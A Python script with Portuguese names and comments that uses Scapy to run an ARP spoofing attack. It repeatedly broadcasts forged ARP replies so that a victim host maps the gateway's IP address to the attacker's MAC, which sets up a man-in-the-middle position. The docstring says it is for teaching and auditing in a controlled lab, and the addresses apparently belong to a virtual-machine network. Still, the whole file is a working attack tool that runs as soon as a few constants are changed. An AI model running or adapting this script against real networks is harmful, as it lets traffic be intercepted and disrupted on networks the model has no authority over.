from scapy.all import ARP, Ether, sendp, conf
import time


IP_GATEWAY = "192.168.56.1"
MAC_ATACANTE = "08:00:27:38:b1:c8"
IP_VITIMA = "192.168.56.101"
INTERFACE = "enp0s8"
INTERVALO_ENVIO = 2


def simular_arp_spoofing() -> None:
    """
    Envia ARP Replies falsos anunciando que o IP do gateway pertence ao MAC do atacante

    Este script e exclusivamente para fins didaticos e de auditoria em ambiente controlado
    """

    conf.verb = 0

    print("=" * 60)
    print("   Simulador de ARP Spoofing - Uso Didatico")
    print("=" * 60)
    print(f"\n[*] Alvo do spoofing: IP {IP_GATEWAY} sera anunciado com MAC {MAC_ATACANTE}")
    print(f"[*] Vitima: {IP_VITIMA}")
    print(f"[*] Enviando um pacote a cada {INTERVALO_ENVIO}s | Ctrl+C para parar\n")

    pacotes_enviados = 0

    try:
        while True:
            frame = Ether(dst="ff:ff:ff:ff:ff:ff", src=MAC_ATACANTE)
            arp_falso = ARP(
                op=2,
                pdst=IP_VITIMA,
                hwdst="ff:ff:ff:ff:ff:ff",
                psrc=IP_GATEWAY,
                hwsrc=MAC_ATACANTE
            )

            sendp(frame / arp_falso, iface=INTERFACE)
            pacotes_enviados += 1
            print(f"[{pacotes_enviados:>4}] ARP Reply falso enviado: {IP_GATEWAY} is-at {MAC_ATACANTE}")

            time.sleep(INTERVALO_ENVIO)

    except KeyboardInterrupt:
        print(f"\n[*] Simulacao encerrada. Total de pacotes enviados: {pacotes_enviados}")


simular_arp_spoofing()
